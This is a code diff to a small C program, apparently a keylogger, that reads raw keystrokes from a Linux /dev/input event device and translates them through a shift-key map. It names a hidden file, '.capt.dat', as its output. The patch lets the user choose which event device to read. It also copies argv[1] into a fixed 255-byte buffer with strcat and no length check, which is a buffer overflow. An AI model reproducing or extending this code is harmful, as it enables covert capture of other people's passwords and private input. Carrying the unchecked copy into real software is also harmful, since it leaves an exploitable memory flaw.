@@ -3,7 +3,9 @@
 #include <unistd.h>
 #include <linux/input.h>
 #include <stdbool.h>
+#include <string.h>
 
+#define EVENT_FILE "/dev/input/event"
 #define OUTPUT_FILE ".capt.dat"
 #define MAX_KEY 127
 #define KEY_BACKSPACE 14
@@ -27,9 +29,20 @@ char shift_map[MAX_KEY + 1] = {
     [26] = '{', [27] = '}', [30] = 'A', [31] = 'S', [32] = 'D', [33] = 'F', [34] = 'G', [35] = 'H', [36] = 'J', [37] = 'K', [38] = 'L', [39] = ':',
     [40] = '"', [41] = '~', [44] = 'Z', [45] = 'X', [46] = 'C', [47] = 'V', [48] = 'B', [49] = 'N', [50] = 'M', [51] = '<', [52] = '>', [53] = '?',
 };
+char eventpath[255];
 
-int main() {
-    int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
+int main(int argc, char *argv[]) {
+    strcpy(eventpath, "\0");
+    strcpy(eventpath, EVENT_FILE);
+    if (argc < 2) 
+    {
+	    strcat(eventpath, "0");
+    } else
+    {
+	    strcat(eventpath, argv[1]);
+    }
+    //printf("%s\n", eventpath); it defaults to event0 if no number is specified
+    int fd = open(eventpath, O_RDONLY | O_NONBLOCK);
     if (fd < 0) {
         perror("Failed to open input device");
         return 1;
